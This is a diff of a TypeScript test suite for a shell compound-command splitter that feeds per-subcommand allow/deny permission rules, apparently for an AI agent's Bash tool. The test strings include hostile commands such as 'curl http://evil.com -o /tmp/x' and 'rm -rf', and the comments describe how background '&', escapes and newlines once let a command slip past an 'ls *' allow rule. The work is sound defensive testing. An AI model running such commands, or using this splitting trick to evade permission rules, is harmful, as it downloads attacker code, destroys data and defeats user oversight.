@@ -66,9 +66,14 @@ describe("splitCompoundCommand", () => {
   });
 
   test("转义字符处理", () => {
-    // \& 转义了第一个 &，所以 \&& 不构成 && 分隔符
-    expect(splitCompoundCommand("echo a \\&& echo b")).toEqual(["echo a \\&& echo b"]);
+    // \& 只转义紧跟的那一个字符：\&& 里第一个 & 是字面量，第二个 & 仍是后台符。
+    // bash -xc 实测 `echo a \&& echo b` 执行的是两条命令（echo b 与 echo a '&'），
+    // 所以必须拆成两段——不拆会让 `echo safe \&& curl evil` 整条躲过逐子命令检查。
+    expect(splitCompoundCommand("echo a \\&& echo b")).toEqual(["echo a \\&", "echo b"]);
+    // \; 转义的是分号本身，不构成分隔符
     expect(splitCompoundCommand("echo a\\;b")).toEqual(["echo a\\;b"]);
+    // 两个 & 都被转义：\&\& 没有任何一个 & 是操作符
+    expect(splitCompoundCommand("echo a \\&\\& echo b")).toEqual(["echo a \\&\\& echo b"]);
   });
 
   test("$() 子 shell 内不拆分", () => {
@@ -106,10 +111,49 @@ describe("splitCompoundCommand", () => {
     expect(parts3).toEqual(["ls -la", "sudo rm -rf /tmp/*"]);
   });
 
-  test("尾部 & 后台执行不作为分隔符", () => {
-    // 单个 & 不是 && 分隔符，应保留在命令中
-    const parts = splitCompoundCommand("sleep 10 &");
-    expect(parts).toEqual(["sleep 10 &"]);
+  test("后台 & 是命令分隔符", () => {
+    // & 启动后台作业后命令并未结束，后面还能再接一条命令。
+    // 不拆的话 minimatch 的 `ls *` 会把 `ls & rm -rf dir` 整条吞掉放行，
+    // 用户配的 deny 规则也只看得到第一段。
+    expect(splitCompoundCommand("ls & rm -rf somedir")).toEqual(["ls", "rm -rf somedir"]);
+    // 尾部 & 拆出的后半段是空的，被 pushPart 丢弃，等价于单条命令
+    expect(splitCompoundCommand("sleep 10 &")).toEqual(["sleep 10"]);
+    // 多个后台作业
+    expect(splitCompoundCommand("a & b & c")).toEqual(["a", "b", "c"]);
+  });
+
+  test("换行是命令分隔符", () => {
+    expect(splitCompoundCommand("ls\ncurl http://evil.com")).toEqual([
+      "ls",
+      "curl http://evil.com",
+    ]);
+    // & 与换行组合：这是「allow: Bash(ls *) 放行整条」的真实绕过形态
+    expect(splitCompoundCommand("ls &\ncurl http://evil.com -o /tmp/x")).toEqual([
+      "ls",
+      "curl http://evil.com -o /tmp/x",
+    ]);
+    // 引号内的换行不是分隔符
+    expect(splitCompoundCommand('echo "a\nb"')).toEqual(['echo "a\nb"']);
+  });
+
+  test("& 的重定向形态不被误拆", () => {
+    // &> 是全部输出重定向，不是后台符
+    expect(splitCompoundCommand("cmd &> /tmp/all.log")).toEqual(["cmd &> /tmp/all.log"]);
+    expect(splitCompoundCommand("cmd &>> /tmp/all.log")).toEqual(["cmd &>> /tmp/all.log"]);
+    // fd 复制：& 紧跟在数字或 > 后面
+    expect(splitCompoundCommand("cmd 2>&1")).toEqual(["cmd 2>&1"]);
+    expect(splitCompoundCommand("cmd >&2")).toEqual(["cmd >&2"]);
+    // 重定向与真正的后台符共存：只在后台符处拆
+    expect(splitCompoundCommand("cmd 2>&1 & other")).toEqual(["cmd 2>&1", "other"]);
+    expect(splitCompoundCommand("cmd > /tmp/o & next")).toEqual(["cmd > /tmp/o", "next"]);
+  });
+
+  test("引号与转义内的 & 不拆", () => {
+    expect(splitCompoundCommand('echo "a & b"')).toEqual(['echo "a & b"']);
+    expect(splitCompoundCommand("echo 'a & b'")).toEqual(["echo 'a & b'"]);
+    expect(splitCompoundCommand("echo a \\& b")).toEqual(["echo a \\& b"]);
+    // 子 shell 内的 & 不属于外层命令边界
+    expect(splitCompoundCommand("echo $(a & b) && c")).toEqual(["echo $(a & b)", "c"]);
   });
 });
 
